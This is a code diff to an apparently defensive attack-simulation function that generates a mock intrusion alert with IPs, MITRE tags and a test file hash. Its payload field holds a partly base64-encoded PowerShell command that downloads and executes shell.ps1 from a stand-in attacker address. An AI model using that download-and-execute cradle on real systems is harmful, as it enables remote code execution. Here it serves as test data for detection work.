@@ -27,6 +27,9 @@ def simulate_attack():
         "title": "ET SCAN Nmap Scripting Engine & Remote Code Execution Attempt",
         "src_ip": "192.168.63.250",
         "dest_ip": "192.168.214.10",
+        "agent_ip": "192.168.214.10",
+        "victim_ip": "192.168.214.10",
+        "primary_hash": "44d88612fea8a8f36de82e1278abb02f",
         "mitre": ["T1046 - Network Service Discovery", "T1059.001 - PowerShell"],
         "file_hashes": ["44d88612fea8a8f36de82e1278abb02f"],
         "encoded_payload": "cG93ZXJzaGVsbCAtZW5jIElFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnhttp://192.168.63.250/shell.ps1')"
